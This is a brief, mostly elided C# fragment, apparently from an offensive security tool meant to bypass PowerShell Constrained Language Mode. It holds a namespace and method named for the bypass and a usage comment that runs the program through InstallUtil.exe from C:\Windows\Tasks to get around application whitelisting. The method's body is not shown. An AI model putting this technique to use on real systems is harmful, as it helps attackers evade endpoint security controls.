...
namespace Powershell_CLM_Bypass_InstallUtil
{
    class Program
    {
        ...
        public static void pwsh_clm_bypass()
        {
    ...
    // usage: InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\Program.exe"
